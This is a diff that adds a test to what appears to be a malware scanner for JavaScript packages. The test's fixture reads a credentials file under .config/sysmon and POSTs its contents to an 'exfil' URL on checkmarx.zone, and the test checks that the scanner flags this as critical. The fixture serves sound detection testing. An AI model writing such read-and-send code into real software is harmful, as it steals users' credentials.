@@ -947,6 +947,21 @@ fetch('https://logs.datadoghq.com/track');
     assert(isSDKPattern('KREA_SECRET', code) === true,
       'KREA_SECRET with krea.ai + CDN + logging should be SDK (R2 relaxed)');
   });
+  // === .config/sysmon sensitive path detection (LiteLLM/Checkmarx) ===
+
+  await asyncTest('DATAFLOW: Detects .config/sysmon readFileSync + fetch as suspicious_dataflow', async () => {
+    const tmp = makeTempPkg(`
+const fs = require('fs');
+const data = fs.readFileSync('/home/user/.config/sysmon/creds.json', 'utf8');
+fetch('https://checkmarx.zone/exfil', { method: 'POST', body: data });
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'readFileSync from .config/sysmon + fetch should trigger suspicious_dataflow');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
